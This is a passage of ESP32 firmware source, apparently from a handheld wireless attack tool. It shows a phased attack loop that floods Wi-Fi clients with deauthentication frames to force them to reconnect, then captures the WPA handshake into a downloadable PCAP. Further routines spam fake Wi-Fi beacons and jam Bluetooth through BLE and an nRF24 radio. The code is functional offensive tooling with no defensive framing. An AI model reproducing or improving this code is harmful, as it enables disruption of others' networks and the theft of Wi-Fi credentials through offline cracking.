      Serial.printf("[PHASE] Pre-capture done: %u beacons, %u clients\n",
                    beaconCount, clientCount);
      addEvent("PHASE: Pre-capture done — " + String(beaconCount) +
               " beacons, " + String(clientCount) + " clients");
      if (!beaconCaptured) {
        Serial.println("[WARN] No beacons captured yet — continuing anyway");
        addEvent("WARN: No beacons captured — continuing anyway");
      }
      // Transition to deauth burst
      currentPhase = PHASE_DEAUTH_BURST;
      phaseStartTime = now;
      deauthing = true;
      deauthCycles++;
      lastDeauth = 0;
      Serial.printf("[PHASE] Starting deauth burst #%u\n", deauthCycles);
      addEvent("PHASE: Deauth burst #" + String(deauthCycles) + " started");
    }
    break;
  }

  case PHASE_DEAUTH_BURST: {
    // Phase 2: Aggressive deauth burst at 10ms interval (same as original)
    // This forces clients to disconnect
    if (now - lastDeauth >= 10) {
      sendDeauthBurst();
      lastDeauth = now;
    }

    // Check if burst duration is done
    if (now - phaseStartTime >= DEAUTH_BURST_MS) {
      deauthing = false;
      Serial.printf(
          "[PHASE] Deauth burst #%u done: %u packets. Now listening...\n",
          deauthCycles, deauthPktsSent);
      addEvent("PHASE: Deauth burst #" + String(deauthCycles) + " done — " +
               String(deauthPktsSent) + " pkts sent. Listening...");

      // Transition to listen phase (clients will reconnect now)
      currentPhase = PHASE_LISTEN;
      phaseStartTime = now;
    }
    break;
  }

  case PHASE_LISTEN: {
    // Phase 3: STOP all TX — just listen for EAPOL handshake
    // Clients should be reconnecting and doing the 4-way handshake

    // If handshake captured, we can finish early
    if (handshakeCaptured) {
      static bool hsPhaseLogged = false;
      if (!hsPhaseLogged) {
        Serial.println("[PHASE] ★ Handshake captured! Finishing...");
        addEvent("PHASE: ★ Handshake captured! Collecting extra data...");
        hsPhaseLogged = true;
      }
      // Keep listening for a few more seconds to get more data
      if (now - phaseStartTime >= 3000) {
        currentPhase = PHASE_DONE;
        phaseStartTime = now;
        hsPhaseLogged = false;
      }
      break;
    }

    // Listen phase complete — check if we should do another cycle
    if (now - phaseStartTime >= LISTEN_MS) {
      // Check total time
      if (now - attackGlobalStart >= attackTotalDuration) {
        Serial.println("[PHASE] Total time reached. Finishing.");
        addEvent("PHASE: Total time reached — finishing capture");
        currentPhase = PHASE_DONE;
        phaseStartTime = now;
      } else {
        // Another deauth/listen cycle
        currentPhase = PHASE_DEAUTH_BURST;
        phaseStartTime = now;
        deauthing = true;
        deauthCycles++;
        lastDeauth = 0;
        Serial.printf(
            "[PHASE] Starting deauth burst #%u (M1:%u M2:%u M3:%u M4:%u)\n",
            deauthCycles, eapolM1Count, eapolM2Count, eapolM3Count,
            eapolM4Count);
        addEvent("PHASE: Deauth burst #" + String(deauthCycles) +
                 " (M1:" + String(eapolM1Count) +
                 " M2:" + String(eapolM2Count) + " M3:" + String(eapolM3Count) +
                 " M4:" + String(eapolM4Count) + ")");
      }
    }

    // Log status periodically during listen phase
    static unsigned long lastListenLog = 0;
    if (now - lastListenLog >= 3000) {
      Serial.printf("[LISTEN] Waiting for EAPOL... Pkts:%u Beacons:%u Auth:%u "
                    "Assoc:%u EAPOL(M1:%u M2:%u M3:%u M4:%u)\n",
                    totalPacketsCaptured, beaconCount, authFrameCount,
                    assocFrameCount, eapolM1Count, eapolM2Count, eapolM3Count,
                    eapolM4Count);
      lastListenLog = now;
    }
    break;
  }

  case PHASE_DONE: {
    // Phase 4: Save everything and stop
    stopCapture();
    currentPhase = PHASE_IDLE;
    attackGlobalStart = 0;
    Serial.println(
        "[PHASE] Attack sequence complete. PCAP ready for download.");
    addEvent("PHASE: ★ Attack complete! PCAP ready for download.");

    // Restore AP on channel 1 so user can reconnect reliably
    Serial.println("[*] Restoring AP on channel 1...");
    WiFi.softAPdisconnect(true);
    delay(200);
    WiFi.softAP("ZeNeOn", "12345678", 1);
    delay(200);
    dnsServer.stop();
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    Serial.printf("[+] AP restored CH1 | IP: %s\n",
                  WiFi.softAPIP().toString().c_str());
    addEvent("AP restored on CH1 — reconnect to download PCAP");
    break;
  }

  case PHASE_IDLE:
  default:
    break;
  }

  /* ---- LEGACY MANUAL DEAUTH (if triggered by old /attack without phases) ----
   */
  if (deauthing && currentPhase == PHASE_IDLE) {
    if (now - lastDeauth >= 50) {
      sendDeauthBurst();
      lastDeauth = now;
    }
    if (now >= deauthEndTime && deauthEndTime > 0) {
      deauthing = false;
      if (sniffing && pcapFile) {
        stopCapture();
      }
      Serial.printf("[*] Legacy deauth done: %u packets\n", deauthPktsSent);
    }
  }

  /* ---- WIFI SPAM ---- */
  if (spamming) {
    if (now - lastSpam >= 100) {
      spamWiFi();
      lastSpam = now;
    }
  }

  /* ---- BLUETOOTH JAMMER ---- */
  if (btJamming) {
    if (now >= btJamEndTime) {
      btJamming = false;
      esp_ble_gap_stop_scanning();
      esp_ble_gap_stop_advertising();
      delay(50);
      btJamDeinit();
      Serial.printf("[BT] Jam complete: %u pkts\n", btJamPktsSent);
      addEvent("BT Jam complete: " + String(btJamPktsSent) + " pkts sent");
    } else if (now - lastBtJam >= 100) {
      // Send burst every ~100ms — allows each burst to actually transmit
      sendBtJamBurst();
      lastBtJam = now;
    }
  }

  /* ---- NRF24 CLASSIC BT JAMMER ---- */
  if (nrfJamming) {
    if (now >= nrfJamEndTime) {
      nrfJamming = false;
      nrfJamDeinit();
      Serial.printf("[NRF] Jam complete: %u pkts\n", nrfJamPktsSent);
      addEvent("nRF24 Jam complete: " + String(nrfJamPktsSent) + " pkts sent");
    } else {
      // Jam as fast as possible — no delay, hop all 79 BT channels continuously
      sendNrfJamBurst();
    }
  }
}
